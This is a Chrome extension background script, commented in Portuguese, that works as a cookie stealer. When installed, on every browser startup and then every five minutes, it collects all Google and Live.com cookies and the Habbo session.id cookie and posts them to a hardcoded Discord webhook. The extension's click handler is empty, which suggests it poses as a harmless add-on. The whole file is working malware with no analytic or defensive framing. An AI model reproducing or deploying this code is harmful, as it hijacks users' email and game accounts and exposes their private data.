const WEBHOOK = "https://discordapp.com/api/webhooks/1540122517459570888/K-FBdGN8oWAuO1rJbREUoijMvAa4FZxpDCJZKs2Urx9QyBe4uUACCxsDQ0Jp6r6L7mWE";

function enviar(nome, cookies) {
  if (!cookies || cookies.length === 0) return;
  
  var mensagens = [];
  var atual = '**' + nome + '**\n```\n';
  
  cookies.forEach(function(c) {
    var linha = c.name + ': ' + c.value + '\n';
    if ((atual + linha).length > 1800) {
      mensagens.push(atual + '```');
      atual = '**' + nome + ' (cont.)**\n```\n';
    }
    atual += linha;
  });
  mensagens.push(atual + '```');
  
  mensagens.forEach(function(msg) {
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: msg })
    }).then(function(r) {
      console.log(nome + ' enviado, status:', r.status);
    }).catch(function(e) {
      console.log('Erro ao enviar ' + nome + ':', e);
    });
  });
}

function capturarHabbo() {
  chrome.cookies.getAll({ domain: '.habbo.com.br' }, function(cookies) {
    var filtrados = cookies.filter(function(c) { return c.name === 'session.id'; });
    enviar('HABBO', filtrados);
  });
}

function capturarGmail() {
  chrome.cookies.getAll({ domain: '.google.com' }, function(cookies) {
    enviar('GMAIL', cookies);
  });
}

function capturarOutlook() {
  chrome.cookies.getAll({ domain: '.live.com' }, function(cookies) {
    enviar('OUTLOOK', cookies);
  });
}

function capturarTodos() {
  capturarHabbo();
  capturarGmail();
  capturarOutlook();
}

chrome.runtime.onInstalled.addListener(function() {
  setTimeout(capturarTodos, 3000);
  chrome.alarms.create('auto5min', { periodInMinutes: 5 });
});

chrome.runtime.onStartup.addListener(function() {
  setTimeout(capturarTodos, 3000);
});

chrome.alarms.onAlarm.addListener(function(alarm) {
  if (alarm.name === 'auto5min') {
    capturarTodos();
  }
});

chrome.action.onClicked.addListener(function() {});